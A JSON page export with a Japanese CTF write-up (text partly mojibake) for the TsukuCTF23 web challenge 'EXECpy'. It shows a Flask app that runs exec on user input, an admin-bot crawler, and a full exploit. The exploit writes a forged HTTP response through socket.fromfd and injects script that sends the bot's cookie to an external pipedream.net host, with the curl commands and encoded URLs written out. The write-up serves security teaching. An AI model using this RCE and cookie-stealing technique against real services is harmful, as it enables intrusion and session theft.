{"pageProps":{"postData":{"id":"EXECpy","contentHtml":"# EXECpy\n\n## å•é¡Œæ–‡\n\nRCEã‹ã‚™ã‚ã‚“ã¨ã‚™ãã•ã„?\\\nãƒ†ã‚™ãƒ¼ã‚¿ã‚’`exec`ã«æ¸¡ã—ã¨ã„ãŸã‹ã‚‰RCE2XSSã—ã¦ã­!\n\n<http://118.27.109.12:31416>\n\n**AdminBot:** <http://118.27.109.12:31416/crawler>\n\nHint\\\nwowwow\n\n## é›£æ˜“åº¦\n\n**hard**\n\n## ä½œå•ã«ã‚ãŸã£ã¦\n\nDEF CON 31ã§å°ã•ãé–‹å‚¬ã•ã‚Œã¦ã„ãŸSpaceX Security Challengeã«potetisenseiã¨å‡ºãŸéš›ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’XSSã«è½ã¨ã—è¾¼ã¿ã¾ã—ãŸã€‚\\\npickleã§RCEãŒã§ãã‚‹ã‚·ãƒŠãƒªã‚ªã§ã‚µãƒ¼ãƒå†…éƒ¨ã®ãƒã‚¤ãƒŠãƒªã‚’å–å¾—ã™ã‚‹å¿…è¦ãŒã‚ã£ãŸã®ã§ã™ãŒã€ã‚¢ã‚¦ãƒˆãƒã‚¦ãƒ³ãƒ‰é€šä¿¡ã‚„å¿œç­”æ™‚é–“ã§ã®ã‚ªãƒ©ã‚¯ãƒ«ãŒã§ããªã„(å…±ã«é‹å–¶ã‚¤ãƒ³ãƒ•ãƒ©ã®å•é¡Œ)çŠ¶æ³ã§ã—ãŸã€‚\\\nãã“ã§é–‹ã„ã¦ã„ã‚‹fdã«å–å¾—ã—ãŸã„ãƒ‡ãƒ¼ã‚¿ã‚’æµã—è¾¼ã‚“ã§HTTPå¿œç­”ã¨ã—ã¦è¿”ã™ã“ã¨ã§ã€å…¥æ‰‹ã™ã‚‹æ‰‹æ³•ã‚’ç”¨ã„ã¦ã„ã¾ã—ãŸã€‚\\\nç¾å®Ÿã§ã¯XSS2RCEã¯æœ€é«˜ã§ã™ãŒã€RCE2XSSã¯ã†ã‚Œã—ããªã„ã§ã™ã€‚\n\n## è§£æ³•\n\nURLã€AdminBotã€ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãŒæ¸¡ã•ã‚Œã‚‹ã€‚\\\nã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨Pythonã®execã§ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹è¬ã®ã‚µãƒ¼ãƒ“ã‚¹ã ã€‚\\\n![site1.png](images/site1.png)\\\nãŸã ã—å®Ÿè¡Œçµæœã¯è¿”ã—ã¦ãã‚Œãªã„ã€‚\\\n![site2.png](images/site2.png)\\\nURLã¯`http://118.27.109.12:31416/?code=print%281%29`ã§ã‚ã‚Šã€ã‚³ãƒ¼ãƒ‰ã‚’ã‚¯ã‚¨ãƒªã«æ¸¡ã›ã‚‹ã€‚\\\nAdminBotãŒã‚ã‚‹ã“ã¨ã‹ã‚‰ã‚‚XSSå•é¡Œã ã‚ã†ã€‚\\\n![site3.png](images/site3.png)\\\nã‚½ãƒ¼ã‚¹ã‚’è¦‹ã‚‹ã¨ãƒ¡ã‚¤ãƒ³ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã‚ã£ãŸã€‚\n\n```python\nfrom flask import Flask, render_template, request\n\napp = Flask(__name__)\n\n\n@app.route(\"/\", methods=[\"GET\"])\ndef index():\n    code = request.args.get(\"code\")\n    if not code:\n        return render_template(\"index.html\")\n\n    try:\n        exec(code)\n    except:\n        pass\n\n    return render_template(\"result.html\")\n\n\nif __name__ == \"__main__\":\n    app.run(debug=True, host=\"0.0.0.0\", port=31416)\n```\n\nã‚¯ãƒ­ãƒ¼ãƒ©ãƒ¼ã‚‚è¦‹ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ã«ã€Playwrightã§cookieã«ãƒ•ãƒ©ã‚°ã‚’ä»˜ã‘ã¦ãƒ¦ãƒ¼ã‚¶ã®å…¥åŠ›URLã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã„ã‚‹ã€‚\\\nãŸã ã—ã€ãƒ•ãƒ©ã‚°ãŒä»˜ããŸã‚ã«ã¯`if (\"Tsukushi/2.94\" in header) and (\"ğŸ¤ª\" not in content):`ã®åˆ¶é™ãŒã‚ã‚‹ã€‚\n\n```python\nimport os\nimport asyncio\nfrom playwright.async_api import async_playwright\nfrom flask import Flask, render_template, request\n\napp = Flask(__name__)\n\nDOMAIN = \"nginx\"\nFLAG = os.environ.get(\"FLAG\", \"TsukuCTF23{**********REDACTED**********}\")\n\n\n@app.route(\"/crawler\", methods=[\"GET\"])\ndef index_get():\n    return render_template(\"index_get.html\")\n\n\nasync def crawl(url):\n    async with async_playwright() as p:\n        browser = await p.chromium.launch()\n        page = await browser.new_page()\n\n        try:\n            response = await page.goto(url, timeout=5000)\n            header = await response.header_value(\"Server\")\n            content = await page.content()\n\n            if (\"Tsukushi/2.94\" in header) and (\"ğŸ¤ª\" not in content):\n                await page.context.add_cookies(\n                    [{\"name\": \"FLAG\", \"value\": FLAG, \"domain\": DOMAIN, \"path\": \"/\"}]\n                )\n                if url.startswith(f\"http://{DOMAIN}/?code=\") or url.startswith(\n                    f\"https://{DOMAIN}/?code=\"\n                ):\n                    await page.goto(url, timeout=5000)\n        except:\n            pass\n\n        await browser.close()\n\n\n@app.route(\"/crawler\", methods=[\"POST\"])\ndef index_post():\n    asyncio.run(\n        crawl(\n            request.form.get(\"url\").replace(\n                \"http://localhost:31416/\", f\"http://{DOMAIN}/\", 1\n            )\n        )\n    )\n    return render_template(\"index_post.html\")\n\n\nif __name__ == \"__main__\":\n    app.run(debug=True, host=\"0.0.0.0\", port=31417)\n```\n\nã‚‚ã†ä¸€åº¦ãƒ¡ã‚¤ãƒ³ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®å¿œç­”ã‚’ç¢ºèªã™ã‚‹ã€‚\n\n```bash\n$ curl 'http://118.27.109.12:31416/?code=print%281%29' -I\nHTTP/1.1 200 OK\nServer: nginx/1.25.3\nDate: Sat, 09 Dec 2023 00:00:00 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 1059\nConnection: close\n\n$ curl 'http://118.27.109.12:31416/?code=print%281%29'\n~~\n                <p class=\"block text-gray-700 text-sm font-bold mb-2\">\n                    Your code has been executed. However, no results will be returned. ğŸ¤ª\n                </p>\n~~~\n```\n\n`Server`ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã¯`nginx/1.25.3`ã§ã‚ã‚‹ã®ã§`Tsukushi/2.94`ã§ã¯ãªã„ã€‚\\\nã¾ãŸã€`ğŸ¤ª`ã‚‚ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒœãƒ‡ã‚£ã«å«ã¾ã‚Œã¦ã„ã‚‹ã€‚\\\nã“ã‚Œã‚‰ãŒãªã‘ã‚Œã°`request.cookies.get`ã§å–å¾—ã—ãŸãƒ•ãƒ©ã‚°ã‚’å¤–éƒ¨ã«é€ä¿¡ã™ã‚‹ã ã‘ã§æ¸ˆã‚€(`/bin/*`ãŒç„¡ã„ãŒ)ã€‚\\\nä»¥ä¸Šã®ã“ã¨ã‚ˆã‚Šexecã‚’è¡Œã†ã“ã¨ã§Flaskã®å¿œç­”çµæœã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã¨ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒœãƒ‡ã‚£ã‚’æ›¸ãæ›ãˆã¦XSSã™ã‚‹å•é¡Œã ã¨ã‚ã‹ã‚‹ã€‚\\\nã“ã“ã§execãŒHTTPé€šä¿¡ä¸­ã«è¡Œã‚ã‚Œã‚‹ãŸã‚ã€Flask(ã‹Werkzeug)ãŒfdã‚’ä¿æŒã—ã¦ãŠã‚Šã€ãã“ã«ãƒ‡ãƒ¼ã‚¿ã‚’æµã—è¾¼ã‚€ã“ã¨ã§ã†ã¾ããƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’æ›¸ãæ›ãˆã‚‹ã“ã¨ãŒã§ããã†ãªã“ã¨ã«æ°—ã¥ãã€‚\\\nã‚‚ã—ãã¯ã€execã§è‡ªç”±åº¦ãŒé«˜ã„ã®ã§Pythonã®ãƒ¡ãƒ¢ãƒªä¸Šã«ä¹—ã£ã¦ã„ã‚‹ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’æ›¸ãæ›ãˆã‚‹ã“ã¨ã‚‚ã§ãã‚‹ã‹ã‚‚ã—ã‚Œãªã„ã€‚\\\nå¾Œè€…ã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ç ´å£Šã—ãã†ãªã®ã§ã€å‰è€…ã‚’è©¦ã™ã€‚\\\nFlask(ã‹Werkzeug)ãŒfdã«æ›¸ãè¾¼ã‚“ã§ã„ãªã„ã‹ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’èª¿æŸ»ã™ã‚‹ã€‚\\\n[Flask Source Code](https://github.com/search?q=repo%3Apallets%2Fflask%20file%20descriptor\\&type=code)\\\n[Werkzeug Source Code](https://github.com/search?q=repo%3Apallets%2Fwerkzeug%20file%20descriptor\\&type=code)\\\nã“ã‚Œã‚‰ã‚’è¦‹ã‚‹ã¨[`socket.fromfd`ã®ç®‡æ‰€](https://github.com/pallets/werkzeug/blob/eafbed0ce2a6bdf60e62de82bf4a8365188ac334/src/werkzeug/serving.py#L778)ãŒä½¿ãˆãã†ãªã“ã¨ãŒã‚ã‹ã‚‹ã€‚\\\n[ã“ã“](https://docs.python.org/3/library/socket.html#socket.fromfd)ã‚’è¦‹ã‚‹ã¨ã™ã§ã«ã‚ã‚‹ã‚½ã‚±ãƒƒãƒˆå‚ç…§ã®fdã‹ã‚‰ã‚½ã‚±ãƒƒãƒˆã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œã£ã¦ãã‚Œã‚‹ã‚‰ã—ã„ã“ã¨ãŒã‚ã‹ã‚‹ã€‚\\\nã“ã‚Œã‚’ç”¨ã„ã¦HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’æµã—è¾¼ã‚“ã§ã¿ã‚‹ã€‚\n\n```python\nimport socket\nfor fd in range(100):\n    try:\n        sock = socket.fromfd(fd, socket.AF_INET, socket.SOCK_STREAM)\n        sock.sendall(b'''HTTP/1.1 200 OK\nContent-Length: 6\nContent-Type: text/html\nConnection: Closed\n\nSatoki''')\n    except Exception as e:\n        pass\n```\n\nå®Ÿè¡Œã™ã‚‹ã€‚\n\n```bash\n$ curl 'http://118.27.109.12:31416/?code=import+socket%0D%0Afor+fd+in+range%28100%29%3A%0D%0A++++try%3A%0D%0A++++++++sock+%3D+socket.fromfd%28fd%2C+socket.AF_INET%2C+socket.SOCK_STREAM%29%0D%0A++++++++sock.sendall%28b%27%27%27HTTP%2F1.1+200+OK%0D%0AContent-Length%3A+6%0D%0AContent-Type%3A+text%2Fhtml%0D%0AConnection%3A+Closed%0D%0A%0D%0ASatoki%27%27%27%29%0D%0A++++except+Exception+as+e%3A%0D%0A++++++++pass' -v\n*   Trying 118.27.109.12:31416...\n* Connected to 118.27.109.12 (118.27.109.12) port 31416 (#0)\n> GET /?code=import+socket%0D%0Afor+fd+in+range%28100%29%3A%0D%0A++++try%3A%0D%0A++++++++sock+%3D+socket.fromfd%28fd%2C+socket.AF_INET%2C+socket.SOCK_STREAM%29%0D%0A++++++++sock.sendall%28b%27%27%27HTTP%2F1.1+200+OK%0D%0AContent-Length%3A+6%0D%0AContent-Type%3A+text%2Fhtml%0D%0AConnection%3A+Closed%0D%0A%0D%0ASatoki%27%27%27%29%0D%0A++++except+Exception+as+e%3A%0D%0A++++++++pass HTTP/1.1\n> Host: 118.27.109.12:31416\n> User-Agent: curl/7.81.0\n> Accept: */*\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 200 OK\n< Server: nginx/1.25.3\n< Date: Sat, 09 Dec 2023 00:00:00 GMT\n< Content-Type: text/html\n< Content-Length: 6\n< Connection: close\n<\n* Closing connection 0\nSatoki\n```\n\nç„¡äº‹ã«å¿œç­”ã‚’æ›¸ãæ›ãˆã‚‹ã“ã¨ãŒã§ããŸã€‚\\\nã‚ã¨ã¯é©åˆ‡ãªãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’è¨­å®šã—ã€XSSã—ã¦ãƒ•ãƒ©ã‚°ã‚’å¤–éƒ¨ã‚µãƒ¼ãƒã«é€ä¿¡ã—ã¦ã‚„ã‚Œã°ã‚ˆã„ã€‚\\\nä»¥ä¸‹ã®payload.pyã§XSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ä½œæˆã‚’è¡Œã†ã€‚\n\n```python\n# This script is inspired by potetisensei\n\nURL = \"https://en9i5fcxybxwa.x.pipedream.net/\" # Your server\n\npayload = f\"\"\"\n<!DOCTYPE html>\n<html lang=\"en\">\n    <head></head>\n    <body>\n    <script>location.href='{URL}?s='+document.cookie</script>\n    </body>\n</html>\n\"\"\"\n\nprint(\n    f\"\"\"\nimport socket\nfor fd in range(100):\n    try:\n        sock = socket.fromfd(fd, socket.AF_INET, socket.SOCK_STREAM)\n        sock.sendall(b'''HTTP/1.1 200 OK\nServer: Tsukushi/2.94\nContent-Length: {len(payload)}\nContent-Type: text/html\nConnection: Closed\n\n{payload}''')\n    except Exception as e:\n        pass\n\"\"\"\n)\n```\n\nå®Ÿè¡Œã™ã‚‹ã€‚\n\n```bash\n$ python payload.py\n\nimport socket\nfor fd in range(100):\n    try:\n        sock = socket.fromfd(fd, socket.AF_INET, socket.SOCK_STREAM)\n        sock.sendall(b'''HTTP/1.1 200 OK\nServer: Tsukushi/2.94\nContent-Length: 178\nContent-Type: text/html\nConnection: Closed\n\n\n<!DOCTYPE html>\n<html lang=\"en\">\n    <head></head>\n    <body>\n    <script>location.href='https://en9i5fcxybxwa.x.pipedream.net/?s='+document.cookie</script>\n    </body>\n</html>\n''')\n    except Exception as e:\n        pass\n\n```\n\nã“ã‚Œã‚’URLã‚¯ã‚¨ãƒªã«è¨­å®šã™ã‚‹ã¨ä»¥ä¸‹ã«ãªã‚‹ã€‚\n\n```\nhttp://118.27.109.12:31416/?code=%0D%0Aimport+socket%0D%0Afor+fd+in+range%28100%29%3A%0D%0A++++try%3A%0D%0A++++++++sock+%3D+socket.fromfd%28fd%2C+socket.AF_INET%2C+socket.SOCK_STREAM%29%0D%0A++++++++sock.sendall%28b%27%27%27HTTP%2F1.1+200+OK%0D%0AServer%3A+Tsukushi%2F2.94%0D%0AContent-Length%3A+178%0D%0AContent-Type%3A+text%2Fhtml%0D%0AConnection%3A+Closed%0D%0A%0D%0A%0D%0A%3C%21DOCTYPE+html%3E%0D%0A%3Chtml+lang%3D%22en%22%3E%0D%0A++++%3Chead%3E%3C%2Fhead%3E%0D%0A++++%3Cbody%3E%0D%0A++++%3Cscript%3Elocation.href%3D%27https%3A%2F%2Fen9i5fcxybxwa.x.pipedream.net%2F%3Fs%3D%27%2Bdocument.cookie%3C%2Fscript%3E%0D%0A++++%3C%2Fbody%3E%0D%0A%3C%2Fhtml%3E%0D%0A%27%27%27%29%0D%0A++++except+Exception+as+e%3A%0D%0A++++++++pass%0D%0A\n```\n\ncrawlerã«æŠ•ã’ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒå±Šãã€‚\\\n![flag.png](images/flag.png)\\\nflagãŒå¾—ã‚‰ã‚ŒãŸã€‚\n\n## TsukuCTF23{175\\_4\\_73rr1bl3\\_4774ck\\_70\\_1n73rrup7\\_h77p}\n","title":"EXECpy","description":"RCE2XSS","author":"satoki00","genre":"web","solver":15,"point":499}},"__N_SSG":true}